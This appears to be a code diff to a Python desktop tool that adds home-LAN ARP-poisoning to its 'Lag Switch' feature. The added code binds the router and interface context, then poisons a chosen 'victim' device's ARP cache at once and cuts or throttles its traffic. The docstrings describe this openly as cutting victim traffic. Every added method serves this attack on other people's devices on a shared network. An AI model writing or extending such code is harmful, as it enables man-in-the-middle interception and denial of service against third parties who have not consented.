@@ -970,8 +970,10 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
         self._ics_windivert_shaper = None
         self._ics_lag_gate = None
         self._impairment_stack_warmed_at = 0.0
+        self._lan_impairment_warmed_at = 0.0
         self._impairment_warm_in_flight = False
         self._lag_ics_preblocked = False
+        self._lag_lan_preblocked = False
         self._last_app_inactive_mono = time.monotonic()
         self._ics_kill_profile_macs: set[str] = set()
         self._selected_impairment_mac: str | None = None
@@ -2834,6 +2836,32 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
         except Exception:
             pass
 
+    def _lan_mitm_stack_is_warm(self) -> bool:
+        """True when home-LAN router/iface context was refreshed recently."""
+        warmed_at = float(getattr(self, '_lan_impairment_warmed_at', 0.0))
+        if warmed_at <= 0.0 or time.monotonic() - warmed_at > 300.0:
+            return False
+        iface = getattr(self.scanner, 'iface', None)
+        if iface is None or getattr(iface, 'name', None) in (None, '', 'NULL'):
+            return False
+        router = getattr(self.scanner, 'router', None) or getattr(self.killer, 'router', None)
+        return isinstance(router, dict) and bool(str(router.get('ip') or '').strip())
+
+    def _warm_lan_mitm_stack(self) -> None:
+        """Refresh LAN MITM context once per session (router MAC, iface bind)."""
+        try:
+            iface = getattr(self.scanner, 'iface', None)
+            if iface is not None and getattr(iface, 'name', None) not in (None, '', 'NULL'):
+                self.killer.iface = iface
+            self.scanner.refresh_local_topology()
+            self.killer.router = getattr(self.scanner, 'router', None) or self.killer.router
+            refresh_router = getattr(self.killer, '_refresh_router_mac_for_mitm', None)
+            if callable(refresh_router):
+                refresh_router()
+            self._lan_impairment_warmed_at = time.monotonic()
+        except Exception:
+            pass
+
     def _ics_stack_is_warm(self) -> bool:
         """True when ICS iface/router prep ran recently (startup or wake-from-sleep)."""
         warmed_at = float(getattr(self, '_impairment_stack_warmed_at', 0.0))
@@ -2861,7 +2889,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
 
     def _warm_impairment_stack(self, *, reason: str = 'startup') -> None:
         """
-        Bind hotspot NIC + router context once per session (or after sleep).
+        Bind hotspot NIC + home-LAN router context once per session (or after sleep).
         Lag/Dupe/Kill toggles reuse this instead of re-running netsh/ARP on every click.
         """
         _ = reason
@@ -2871,6 +2899,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
             return
         self._impairment_warm_in_flight = True
         try:
+            self._warm_lan_mitm_stack()
             if not sys.platform.startswith('win') or not clumsy_mode_enabled():
                 return
             from tools.clumsy_inline import (
@@ -3344,6 +3373,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
         """
         Cut victim traffic on Lag click — before deferred prep/teardown.
         Hotspot: WinDivert pause with the table snapshot IP (instant red chain).
+        Home LAN: immediate ARP poison + traffic cut when MITM stack is warm.
         """
         dev = dict(device) if isinstance(device, dict) else {}
         ip = str(dev.get('ip') or '').strip()
@@ -3376,20 +3406,35 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
                     gate.start(direction=direction, start_paused=True)
                     self._ics_lag_gate = gate
                 self._lag_ics_preblocked = True
+                self._lag_lan_preblocked = False
                 return True
             except Exception:
                 self._lag_ics_preblocked = False
                 return False
         if plan.use_arp_mitm:
             mac = str(dev.get('mac') or '').strip()
-            if mac and mac in self.killer.killed:
-                try:
+            if not mac:
+                return False
+            try:
+                self.killer.router = getattr(self.scanner, 'router', None) or self.killer.router
+                self.killer.iface = self.scanner.iface
+                self.killer.disable_percent_cut(mac)
+                if mac in self.killer.killed:
                     self.killer.reassert_poison(dev)
                     self.killer._apply_traffic_cut_sync(dev)
-                    return True
-                except Exception:
-                    pass
+                elif self._lan_mitm_stack_is_warm():
+                    self.killer.kill(dev, wait_after=0.0, traffic_cut=True)
+                else:
+                    return False
+                self._lag_lan_preblocked = True
+                self._lag_ics_preblocked = False
+                self._lag_net_prepared_mac = mac
+                return True
+            except Exception:
+                self._lag_lan_preblocked = False
+                return False
         self._lag_ics_preblocked = False
+        self._lag_lan_preblocked = False
         return False
 
     def startLagSwitch(self, device):
@@ -3424,6 +3469,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
         self._lag_countdown_timer.start()
 
         self._lag_ics_preblocked = False
+        self._lag_lan_preblocked = False
         try:
             self._lag_instant_preblock(snap)
         except Exception:
@@ -3450,6 +3496,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
             work_dev = dict(device)
             work_snap = dict(snap)
             preblocked = bool(getattr(self, '_lag_ics_preblocked', False))
+            lan_preblocked = bool(getattr(self, '_lag_lan_preblocked', False))
             try:
                 if preblocked and self._ics_stack_is_warm():
                     rip = (
@@ -3459,6 +3506,8 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
                     if rip:
                         work_snap['ip'] = rip
                         self.lag_device_ip = rip
+                elif lan_preblocked and self._lan_mitm_stack_is_warm():
+                    self._refresh_victim_mac_from_system_arp(work_snap)
                 else:
                     work_snap = self._prepare_victim_for_impairment(work_snap, fast=True)
                 plan = self._impairment_plan_for(work_snap)
@@ -3493,15 +3542,28 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
                         )
                         return
             else:
-                mitm_ok, mitm_reason = self.killer.mitm_prereqs_ok(work_snap, ping_attempts=1)
-                if not mitm_ok:
-                    self._lag_abort_start(f'Lag failed: {mitm_reason}')
-                    return
-                if not self._arm_victim_mitm_like_kill(
-                    work_snap, self.lag_direction, flow='Lag'
-                ):
-                    self._lag_abort_start('Lag failed: could not arm MITM — rescan target')
-                    return
+                if lan_preblocked:
+                    mac = str(work_snap.get('mac') or '').strip()
+                    if mac:
+                        try:
+                            self.killer.reassert_poison(work_snap)
+                        except Exception:
+                            pass
+                    try:
+                        iface_name = self.scanner.iface.name if self.scanner.iface else 'en0'
+                    except Exception:
+                        iface_name = 'en0'
+                    _bg_block_ip(iface_name, work_snap.get('ip'), self.lag_direction)
+                else:
+                    mitm_ok, mitm_reason = self.killer.mitm_prereqs_ok(work_snap, ping_attempts=1)
+                    if not mitm_ok:
+                        self._lag_abort_start(f'Lag failed: {mitm_reason}')
+                        return
+                    if not self._arm_victim_mitm_like_kill(
+                        work_snap, self.lag_direction, flow='Lag'
+                    ):
+                        self._lag_abort_start('Lag failed: could not arm MITM — rescan target')
+                        return
             self._clear_explicit_kill_for_flow(work_snap)
             self._lag_net_prepared_mac = work_mac
             try:
@@ -3542,6 +3604,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
         self._lag_device_snapshot = None
         self._lag_net_prepared_mac = None
         self._lag_ics_preblocked = False
+        self._lag_lan_preblocked = False
         self._stop_lag_countdown()
         self.btnLagSwitch.setText('Lag Switch')
         self.btnLagSwitch.setStyleSheet(self.BUTTON_NORMAL_STYLE)
@@ -4019,6 +4082,10 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
                         )
             except Exception:
                 pass
+            return True
+        if fast and self._lan_mitm_stack_is_warm():
+            self.killer.iface = self.scanner.iface
+            self.killer.router = getattr(self.scanner, 'router', None) or self.killer.router
             return True
         try:
             from tools.utils import resolve_live_lan_victim
@@ -6022,6 +6089,7 @@ class ZubCutApp(FramelessResizableMixin, QMainWindow, Ui_MainWindow):
         self.lag_device_ip = None
         self._lag_net_prepared_mac = None
         self._lag_ics_preblocked = False
+        self._lag_lan_preblocked = False
         self._lag_phase_arming = False
         self._lag_in_allow_phase = False
         self._lag_restoring_after_stop = False
